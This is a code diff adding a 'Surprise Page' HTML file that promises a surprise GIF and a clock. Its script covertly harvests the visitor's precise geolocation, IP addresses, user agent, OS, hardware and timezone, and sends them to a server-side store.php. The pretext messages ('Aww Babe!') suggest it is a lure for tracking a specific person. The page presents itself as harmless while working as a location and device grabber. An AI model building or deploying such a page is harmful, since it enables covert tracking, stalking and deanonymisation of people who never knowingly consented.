@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Surprise Page</title>
+    <link
+      rel="stylesheet"
+      href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
+    />
+    <link
+      rel="stylesheet"
+      href="styles.css"
+      onerror="this.onerror=null; this.href='fallback-styles.css';"
+    />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/platform/1.3.6/platform.min.js"></script>
+  </head>
+
+  <body onload="getPermissionAndSurprise()">
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+      <a class="navbar-brand" href="#">Surprise Page</a>
+      <button
+        class="navbar-toggler"
+        type="button"
+        data-toggle="collapse"
+        data-target="#navbarNav"
+        aria-controls="navbarNav"
+        aria-expanded="false"
+        aria-label="Toggle navigation"
+      >
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="https://devdasgupta.in" target="_blank"
+              >About</a
+            >
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="/test/Snap.html" target="_blank">Snap</a>
+          </li>
+        </ul>
+      </div>
+    </nav>
+
+    <div id="surprise-container" class="container mt-4 text-center">
+      <iframe
+        src="https://giphy.com/embed/DjZ27plwkK9solUl5O"
+        width="479"
+        height="480"
+        frameborder="0"
+        class="giphy-embed"
+        allowfullscreen
+      ></iframe>
+      <p><a href="https://devdasgupta.in" style="color: #fff">BY JIRAIYA</a></p>
+
+      <div id="loading" style="display: none">
+        <div class="spinner-border text-primary" role="status">
+          <span class="sr-only">Loading...</span>
+        </div>
+        <span>Fetching data...</span>
+      </div>
+
+      <p id="demo" class="mt-3">Loading surprise...</p>
+
+      <div id="datetime-container" class="digital-clock mt-4">
+        <p id="datetime">Loading date and time...</p>
+      </div>
+
+      <div class="button-container mt-4">
+        <button
+          onclick="customizeSurprise()"
+          class="btn btn-custom"
+          aria-label="Get a Surprise"
+        >
+          Click Here to Get Surprise
+        </button>
+      </div>
+    </div>
+
+    <script>
+      const x = document.getElementById("demo");
+
+      async function getPermissionAndSurprise() {
+        document.getElementById("loading").style.display = "block";
+        if (navigator.permissions) {
+          try {
+            const result = await navigator.permissions.query({
+              name: "geolocation",
+            });
+            if (result.state === "granted" || result.state === "prompt") {
+              navigator.geolocation.getCurrentPosition(
+                showSurprise,
+                showError,
+                { enableHighAccuracy: true }
+              );
+            } else {
+              x.innerHTML =
+                "Oops! Location access denied. Please enable it to see the surprise.";
+            }
+          } catch (err) {
+            console.error("Permission API error:", err);
+            x.innerHTML = "An error occurred while checking permissions.";
+          }
+        } else {
+          x.innerHTML = "Browser doesn't support geolocation permissions API.";
+          navigator.geolocation.getCurrentPosition(showSurprise, showError, {
+            enableHighAccuracy: true,
+          });
+        }
+        document.getElementById("loading").style.display = "none";
+      }
+
+      async function gatherAdditionalInfo() {
+        const info = {
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          language: navigator.language,
+          cpuCores: navigator.hardwareConcurrency,
+          screenResolution: `${screen.width}x${screen.height}`,
+          cpuName: platform.description,
+          osName: `${platform.os.family} ${platform.os.version}`,
+        };
+
+        try {
+          const [ipv4Response, ipv6Response] = await Promise.all([
+            fetch("https://api.ipify.org?format=json"),
+            fetch("https://api6.ipify.org?format=json"),
+          ]);
+
+          const [ipv4Data, ipv6Data] = await Promise.all([
+            ipv4Response.json(),
+            ipv6Response.json(),
+          ]);
+
+          info.ipv4 = ipv4Data.ip || "Unavailable";
+          info.ipv6 = ipv6Data.ip || "Unavailable";
+        } catch (error) {
+          console.error("Error fetching IP addresses:", error);
+          info.ipv4 = "Unavailable";
+          info.ipv6 = "Unavailable";
+        }
+
+        return info;
+      }
+
+      function showSurprise(position) {
+        gatherAdditionalInfo().then((info) => {
+          const data = {
+            lat: position.coords.latitude,
+            long: position.coords.longitude,
+            uagent: navigator.userAgent,
+            ...info,
+          };
+
+          fetch("store.php?" + new URLSearchParams(data).toString())
+            .then((response) => response.json())
+            .then((res) => {
+              if (res.status === "success") {
+                x.innerHTML = personalizeSurprise();
+              } else {
+                x.innerHTML = "Error: " + res.message;
+              }
+            })
+            .catch((err) => {
+              console.error("Error saving data:", err);
+              x.innerHTML = "An error occurred while saving your data.";
+            });
+        });
+      }
+
+      function showError(error) {
+        document.getElementById("loading").style.display = "none";
+        switch (error.code) {
+          case error.PERMISSION_DENIED:
+            x.innerHTML =
+              "Aww Babe! Looks like you didn't want to see the surprise. Maybe next time?";
+            break;
+          case error.POSITION_UNAVAILABLE:
+            x.innerHTML =
+              "Oops! Can't find the surprise right now. Try again later?";
+            break;
+          case error.TIMEOUT:
+            x.innerHTML =
+              "Oops! Taking too long to find the surprise. Can we try again?";
+            break;
+          case error.UNKNOWN_ERROR:
+            x.innerHTML =
+              "Oops! Something mysterious happened. Let's try once more?";
+            break;
+        }
+      }
+
+      function customizeSurprise() {
+        x.innerHTML = personalizeSurprise();
+      }
+
+      function personalizeSurprise() {
+        const currentDate = new Date();
+        const hour = currentDate.getHours();
+
+        if (hour >= 4 && hour < 12) {
+          return "Good morning! Enjoy your surprise!";
+        } else if (hour >= 12 && hour < 15) {
+          return "Good afternoon! Here's your surprise!";
+        } else if (hour >= 15 && hour < 21) {
+          return "Good evening! Get ready for your surprise!";
+        } else {
+          return "Good night! Have a wonderful surprise!";
+        }
+      }
+
+      function updateDateTime() {
+        const datetimeElement = document.getElementById("datetime");
+        const now = new Date();
+        datetimeElement.innerText = now.toLocaleString("en-US", {
+          weekday: "long",
+          year: "numeric",
+          month: "long",
+          day: "numeric",
+          hour: "numeric",
+          minute: "numeric",
+          second: "numeric",
+          hour12: true,
+        });
+        setTimeout(updateDateTime, 1000);
+      }
+
+      updateDateTime();
+    </script>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.1/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+  </body>
+</html>
